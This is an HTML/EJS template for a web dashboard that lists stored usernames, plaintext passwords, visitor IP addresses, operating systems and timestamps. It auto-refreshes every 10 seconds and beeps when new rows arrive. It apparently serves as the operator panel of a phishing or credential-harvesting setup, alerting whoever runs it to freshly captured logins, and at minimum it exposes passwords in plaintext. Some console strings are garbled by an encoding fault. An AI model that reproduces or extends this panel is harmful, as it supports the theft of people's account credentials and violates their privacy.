<!DOCTYPE html>
<html>
<head>
  <title>Data Table_I</title>
  <style>
    table {
      width: 100%;
      border-collapse: collapse;
    }
    table, th, td {
      border: 1px solid black;
    }
    th, td {
      padding: 10px;
      text-align: left;
    }
    th {
      background-color: #f2f2f2;
    }
    .buttons {
      margin-bottom: 20px;
    }
    .buttons button {
      padding: 10px;
      margin-right: 10px;
      cursor: pointer;
    }
    .delete-btn {
      background-color: red;
      color: white;
      border: none;
      padding: 5px 10px;
      cursor: pointer;
    }
  </style>
</head>
<body onclick="enableSound()" style="cursor: pointer">

  <div class="buttons">
    <button onclick="window.location.href='/create'">Create Table</button>
    <button onclick="window.location.href='/delete'">Delete Table</button>
    <button onclick="window.location.href='/data'">Home</button>
    <button onclick="window.location.href='/data'">Get Data</button>
  </div>

  <h1>My Table Data</h1>
  <table>
    <thead>
      <tr>
        <th>ID</th>
        <th>Username</th>
        <th>Password</th>
        <th>Request IP</th>
        <th>Request OS</th>
        <th>Request Time</th>
        <th>Remarks</th>
      </tr>
    </thead>
    <tbody>
      <% data.forEach(function(row) { %>
        <tr id="row-<%= row.id %>">
          <td><%= row.id %></td>
          <td><%= row.username %></td>
          <td><%= row.password %></td>
          <td><%= row.requestIP %></td>
          <td><%= row.requestOS %></td>
          <td><%= row.requestTime %></td>
          <td>
            <button class="delete-btn" onclick="deleteRow(<%= row.id %>)">Delete</button>
          </td>
        </tr>
      <% }); %>
    </tbody>
  </table>

  <!-- Hidden Audio for Beep -->
  <audio id="beep" src="/beep.mp3" preload="auto"></audio>

  <script>
    let soundReady = false;

    function enableSound() {
      soundReady = true;
      document.body.onclick = null; // Remove listener after first interaction
      console.log("üîä Sound enabled by user interaction");
    }

    // Count table rows
    const currentRowCount = document.querySelectorAll("tbody tr").length;
    const previousCount = parseInt(localStorage.getItem("rowCount")) || 0;

    console.log("üìä Current rows:", currentRowCount, "Previous rows:", previousCount);

    if (currentRowCount > previousCount && soundReady) {
      const beep = document.getElementById("beep");
      beep.play().then(() => {
        console.log("‚úÖ Beep played");
      }).catch(err => {
        console.warn("‚ùå Beep autoplay blocked:", err);
      });

      // Optionally stop after a while
      setTimeout(() => {
        beep.pause();
        beep.currentTime = 0;
      }, 4000);
    }

    // Save current count for next reload
    localStorage.setItem("rowCount", currentRowCount);

    // Auto-refresh every 10 seconds
    setInterval(() => {
      window.location.reload();
    }, 10000);

    function deleteRow(id) {
      if (!confirm("Are you sure you want to delete this row?")) return;

      fetch(`/delete/${id}`, {
        method: 'DELETE',
      })
      .then(response => {
        if (response.ok) {
          const row = document.getElementById(`row-${id}`);
          if (row) row.remove();
        } else {
          alert("Failed to delete. Try again.");
        }
      })
      .catch(err => {
        console.error("‚ùå Delete error:", err);
        alert("Error deleting row.");
      });
    }
  </script>
</body>
</html>
